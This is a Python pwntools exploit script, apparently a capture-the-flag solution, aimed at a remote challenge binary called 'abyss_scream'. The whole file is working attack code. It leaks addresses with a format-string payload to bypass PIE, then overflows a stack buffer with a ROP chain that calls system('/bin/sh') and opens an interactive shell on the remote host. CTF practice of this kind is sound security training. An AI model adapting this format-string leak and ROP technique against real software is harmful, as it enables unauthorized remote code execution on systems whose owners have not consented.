#!/usr/bin/env python3

from pwn import *

exe = ELF("./abyss_scream")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

# p = process("./abyss_scream")
# gdb.attach(p, gdbscript="""
#     set follow-fork-mode parent
#     b *save_msg+274
# """)

p = remote("chall.polygl0ts.ch", 9001)

p.recvline()
p.sendline(b"x")

p.recvuntil(b"name:")
p.sendline(b"/bin/sh")

frmt = b"%30$pAAAA%41$p"

p.recvuntil(b"message:")
p.sendline(frmt)

p.recvuntil(b"message:")
p.recvline()

leak = p.recvuntil(b"AAAA")
exe_leak = int(leak[:14],16)
leak2 = p.recvline().strip()
binsh_heap = int(leak2,16)

exe.address = exe_leak - 0x131e

system_plt = exe.plt["system"]
pop_rdi = exe.address + 0x13b5
ret = exe.address + 0x101a
log.success(f"{hex(system_plt)=}")
log.success(f"{hex(binsh_heap)=}")

p.recvline()
p.sendline(b"x")

p.recvuntil(b"name:")
p.sendline(b"CCCC")

payload = b"B"*0x118
payload += p64(pop_rdi)
payload += p64(binsh_heap)
payload += p64(ret)
payload += p64(system_plt)

p.recvuntil(b"message:")
p.sendline(payload)

p.interactive()